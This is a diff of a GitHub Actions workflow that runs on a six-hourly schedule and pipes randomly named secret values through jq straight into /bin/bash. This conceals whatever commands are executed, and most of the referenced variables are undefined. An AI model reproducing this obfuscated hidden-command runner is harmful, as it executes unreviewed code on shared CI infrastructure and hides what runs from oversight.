@@ -3,7 +3,8 @@ name: fuliming9891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
+    - cron: '59 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +13,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: fuliming9891
         env:
-          w1437: ${{ secrets.w1437 }}
+          dglsg593: ${{ secrets.dglsg593 }}
         run: |
-          echo $w1437 | jq -r .vu187 | /bin/bash
-          echo $eqb0704 | jq -r .xx6 | /bin/bash
-          echo $jrn01393 | jq -r .kd8 | /bin/bash
-          echo $dfljt74 | jq -r .ssllb0 | /bin/bash
-          echo $crf6306 | jq -r .mct932 | /bin/bash
-          echo $d919 | jq -r .xtbgv98107 | /bin/bash
-          echo $sg54754 | jq -r .ok8369 | /bin/bash
-          echo $rafsc231 | jq -r .d5 | /bin/bash
-          echo $xlm96461 | jq -r .v857 | /bin/bash
-          echo $n934 | jq -r .lhuy80369 | /bin/bash
-          echo $wfsrk836 | jq -r .d5254 | /bin/bash
-          echo $dht3 | jq -r .ago8237 | /bin/bash
-          echo $sxbt1 | jq -r .neb03373 | /bin/bash
-          echo $dlq14029 | jq -r .hfjzv97560 | /bin/bash
+          echo $dglsg593 | jq -r .huzdj52 | /bin/bash
+          echo $nnct4 | jq -r .hxe4 | /bin/bash
+          echo $tl8 | jq -r .a31407 | /bin/bash
+          echo $rgly4 | jq -r .ljxad65327 | /bin/bash
+          echo $ugszv22785 | jq -r .gkaa835 | /bin/bash
+          echo $ziq3 | jq -r .ufr3 | /bin/bash
+          echo $trwmt76868 | jq -r .qmtu04270 | /bin/bash
+          echo $e1 | jq -r .fotla88 | /bin/bash
+          echo $fledx66674 | jq -r .iphb3 | /bin/bash
+          echo $uq75773 | jq -r .en01248 | /bin/bash
+          echo $wgm7143 | jq -r .oyhsv094 | /bin/bash
+          echo $gsv157 | jq -r .sk0292 | /bin/bash
 
